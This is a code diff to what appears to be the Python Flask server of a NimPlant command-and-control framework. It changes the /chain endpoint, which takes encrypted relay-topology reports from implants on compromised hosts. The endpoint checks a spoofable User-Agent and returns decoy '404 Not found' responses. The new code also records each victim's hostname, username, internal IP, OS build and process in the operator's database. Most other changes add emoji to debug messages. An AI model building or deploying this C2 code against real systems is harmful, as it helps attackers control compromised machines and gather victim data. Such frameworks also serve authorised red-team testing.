@@ -841,55 +841,56 @@ def nim_implants_server(xor_key):
             return flask.jsonify(status="Not found"), 404
 
     @app.route("/chain", methods=["POST"])
-    # Receive chain info (distributed topology) from implants  
+    # Enhanced chain info receiver for distributed relay system
     def receive_chain_info():
         client_ip = get_external_ip(flask.request)
-        utils.nimplant_print(f"DEBUG: [ROUTE ACTIVATED] chain_info: {flask.request.method} /chain from {client_ip}")
-        utils.nimplant_print(f"DEBUG: Complete headers: {dict(flask.request.headers)}")
+        utils.nimplant_print(f"DEBUG: [ROUTE ACTIVATED] 📡 /chain endpoint from {client_ip}")
+        utils.nimplant_print(f"DEBUG: 📡 === RECEIVING CHAIN INFO ===")
+        utils.nimplant_print(f"DEBUG: 📡 Complete headers: {dict(flask.request.headers)}")
         
         if not flask.request.is_json:
-            utils.nimplant_print(f"DEBUG: ERROR - Request does not contain valid JSON")
+            utils.nimplant_print(f"DEBUG: 📡 ❌ Request does not contain valid JSON")
             return flask.jsonify(status="Not found"), 404
             
-        utils.nimplant_print(f"DEBUG: JSON body: {flask.request.json}")
+        utils.nimplant_print(f"DEBUG: 📡 JSON body: {flask.request.json}")
         
         request_id = flask.request.headers.get("X-Request-ID", "NO_ID")
         agent_header = flask.request.headers.get("User-Agent")
         
-        utils.nimplant_print(f"DEBUG: Verifying headers - X-Request-ID: '{request_id}'")
-        utils.nimplant_print(f"DEBUG: Verifying headers - User-Agent: '{agent_header}' (expected: '{user_agent}')")
+        utils.nimplant_print(f"DEBUG: 📡 Verifying headers - X-Request-ID: '{request_id}'")
+        utils.nimplant_print(f"DEBUG: 📡 Verifying headers - User-Agent: '{agent_header}' (expected: '{user_agent}')")
         
         data = flask.request.json
         np: NimPlant = np_server.get_nimplant_by_guid(request_id)
         
         if np is not None:
-            utils.nimplant_print(f"DEBUG: Implant found: {np.guid}")
+            utils.nimplant_print(f"DEBUG: 📡 ✅ Implant found: {np.guid}")
             
             if user_agent == agent_header:
-                utils.nimplant_print(f"DEBUG: Valid User-Agent")
+                utils.nimplant_print(f"DEBUG: 📡 ✅ Valid User-Agent")
                 
                 try:
                     if "data" not in data:
-                        utils.nimplant_print(f"DEBUG: ERROR - JSON does not contain 'data' field")
+                        utils.nimplant_print(f"DEBUG: 📡 ❌ JSON does not contain 'data' field")
                         return flask.jsonify(status="Not found"), 404
                         
                     encrypted_data = data["data"]
-                    utils.nimplant_print(f"DEBUG: Encrypted chain info received (length: {len(encrypted_data) if encrypted_data else 0})")
+                    utils.nimplant_print(f"DEBUG: 📡 🔐 Encrypted chain info received (length: {len(encrypted_data) if encrypted_data else 0})")
                     
-                    utils.nimplant_print(f"DEBUG: Decrypting chain info data...")
+                    utils.nimplant_print(f"DEBUG: 📡 🔓 Decrypting chain info data...")
                     decrypted_data = decrypt_data(encrypted_data, np.encryption_key)
-                    utils.nimplant_print(f"DEBUG: Decrypted chain info: {decrypted_data}")
+                    utils.nimplant_print(f"DEBUG: 📡 🔓 Decrypted chain info: {decrypted_data}")
                     
                     chain_data = json.loads(decrypted_data)
-                    utils.nimplant_print(f"DEBUG: Parsed chain info JSON: {chain_data}")
+                    utils.nimplant_print(f"DEBUG: 📡 📝 Parsed chain info JSON: {chain_data}")
                     
                     # Validate chain info structure
                     if "type" not in chain_data or chain_data["type"] != "chain_info":
-                        utils.nimplant_print(f"DEBUG: ERROR - Invalid chain info type")
+                        utils.nimplant_print(f"DEBUG: 📡 ❌ Invalid chain info type")
                         return flask.jsonify(status="Not found"), 404
                         
                     if "nimplant_guid" not in chain_data or "my_role" not in chain_data:
-                        utils.nimplant_print(f"DEBUG: ERROR - Missing required chain info fields")
+                        utils.nimplant_print(f"DEBUG: 📡 ❌ Missing required chain info fields")
                         return flask.jsonify(status="Not found"), 404
                     
                     nimplant_guid = chain_data["nimplant_guid"]
@@ -897,43 +898,82 @@ def nim_implants_server(xor_key):
                     role = chain_data["my_role"]
                     listening_port = chain_data.get("listening_port", 0)
                     
-                    utils.nimplant_print(f"DEBUG: 🔗 Chain Info - GUID: {nimplant_guid}, Parent: {parent_guid}, Role: {role}, Port: {listening_port}")
+                    utils.nimplant_print(f"DEBUG: 📡 🔗 Chain Info - GUID: {nimplant_guid}, Parent: {parent_guid}, Role: {role}, Port: {listening_port}")
+                    
+                    # Enhanced system information processing if available
+                    if "system_info" in chain_data:
+                        system_info = chain_data["system_info"]
+                        utils.nimplant_print(f"DEBUG: 📡 💻 System Info - Hostname: {system_info.get('hostname', 'N/A')}")
+                        utils.nimplant_print(f"DEBUG: 📡 💻 System Info - Username: {system_info.get('username', 'N/A')}")
+                        utils.nimplant_print(f"DEBUG: 📡 💻 System Info - Internal IP: {system_info.get('internal_ip', 'N/A')}")
+                        utils.nimplant_print(f"DEBUG: 📡 💻 System Info - OS: {system_info.get('os_build', 'N/A')}")
+                        utils.nimplant_print(f"DEBUG: 📡 💻 System Info - Process: {system_info.get('process_name', 'N/A')}")
+                        utils.nimplant_print(f"DEBUG: 📡 💻 System Info - PID: {system_info.get('pid', 'N/A')}")
+                        
+                        # Update implant system info if provided
+                        if system_info.get('hostname'):
+                            np.hostname = system_info['hostname']
+                        if system_info.get('username'):
+                            np.username = system_info['username']
+                        if system_info.get('internal_ip'):
+                            np.ip_internal = system_info['internal_ip']
+                        if system_info.get('os_build'):
+                            np.os_build = system_info['os_build']
+                        if system_info.get('process_name'):
+                            np.process_name = system_info['process_name']
+                        
+                        utils.nimplant_print(f"DEBUG: 📡 ✅ Updated implant system info from chain data")
+                    
+                    # Connection health information if available
+                    if "connection_health" in chain_data:
+                        conn_health = chain_data["connection_health"]
+                        utils.nimplant_print(f"DEBUG: 📡 🔌 Connection Health - Active: {conn_health.get('active', 'N/A')}")
+                        utils.nimplant_print(f"DEBUG: 📡 🔌 Connection Health - Last Check-in: {conn_health.get('last_checkin', 'N/A')}")
+                        utils.nimplant_print(f"DEBUG: 📡 🔌 Connection Health - Type: {conn_health.get('connection_type', 'N/A')}")
                     
                     # Validate that the request comes from the same implant
                     if nimplant_guid != np.guid:
-                        utils.nimplant_print(f"DEBUG: ERROR - GUID mismatch: request from {np.guid} but chain info for {nimplant_guid}")
+                        utils.nimplant_print(f"DEBUG: 📡 ❌ GUID mismatch: request from {np.guid} but chain info for {nimplant_guid}")
                         return flask.jsonify(status="Not found"), 404
                     
                     # Update relay role based on chain info (this is AUTHORITATIVE)
                     current_role = db.db_get_nimplant_relay_role(np.guid)
                     if current_role != role:
                         db.db_update_nimplant_relay_role(np.guid, role)
-                        utils.nimplant_print(f"DEBUG: 🔗 Updated {np.guid} role: {current_role} → {role}")
+                        utils.nimplant_print(f"DEBUG: 📡 🔄 Updated {np.guid} role: {current_role} → {role}")
                     else:
-                        utils.nimplant_print(f"DEBUG: 🔗 Role unchanged for {np.guid}: {role}")
+                        utils.nimplant_print(f"DEBUG: 📡 ✅ Role unchanged for {np.guid}: {role}")
                     
-                    # Store chain relationship in database
+                    # Store chain relationship in database with enhanced information
                     if db.db_store_chain_relationship(np.guid, parent_guid, role, listening_port):
-                        utils.nimplant_print(f"DEBUG: 🔗 Chain relationship stored for {np.guid}")
+                        utils.nimplant_print(f"DEBUG: 📡 ✅ Chain relationship stored for {np.guid}")
+                        
+                        # Update the implant in the database with fresh system info
+                        db.db_update_nimplant(np)
+                        utils.nimplant_print(f"DEBUG: 📡 ✅ Implant system info updated in database")
+                        
+                        utils.nimplant_print(f"DEBUG: 📡 === END CHAIN INFO PROCESSING (SUCCESS) ===")
                         return flask.jsonify(status="OK"), 200
                     else:
-                        utils.nimplant_print(f"DEBUG: ERROR - Failed to store chain relationship")
+                        utils.nimplant_print(f"DEBUG: 📡 ❌ Failed to store chain relationship")
+                        utils.nimplant_print(f"DEBUG: 📡 === END CHAIN INFO PROCESSING (DB ERROR) ===")
                         return flask.jsonify(status="Error"), 500
                         
                 except Exception as e:
-                    utils.nimplant_print(f"DEBUG: ERROR processing chain info: {str(e)}")
-                    utils.nimplant_print(f"DEBUG: Exception type: {type(e).__name__}")
+                    utils.nimplant_print(f"DEBUG: 📡 ❌ ERROR processing chain info: {str(e)}")
+                    utils.nimplant_print(f"DEBUG: 📡 ❌ Exception type: {type(e).__name__}")
                     import traceback
-                    utils.nimplant_print(f"DEBUG: Traceback: {traceback.format_exc()}")
+                    utils.nimplant_print(f"DEBUG: 📡 ❌ Traceback: {traceback.format_exc()}")
+                    utils.nimplant_print(f"DEBUG: 📡 === END CHAIN INFO PROCESSING (EXCEPTION) ===")
                     return flask.jsonify(status="Not found"), 404
             else:
-                utils.nimplant_print(f"DEBUG: ERROR - Incorrect User-Agent: '{agent_header}'")
+                utils.nimplant_print(f"DEBUG: 📡 ❌ Incorrect User-Agent: '{agent_header}'")
                 notify_bad_request(
                     flask.request, BadRequestReason.USER_AGENT_MISMATCH, np.guid
                 )
                 return flask.jsonify(status="Not found"), 404
         else:
-            utils.nimplant_print(f"DEBUG: ERROR - Implant with ID not found: {request_id}")
+            utils.nimplant_print(f"DEBUG: 📡 ❌ Implant with ID not found: {request_id}")
             notify_bad_request(flask.request, BadRequestReason.ID_NOT_FOUND)
             return flask.jsonify(status="Not found"), 404
 
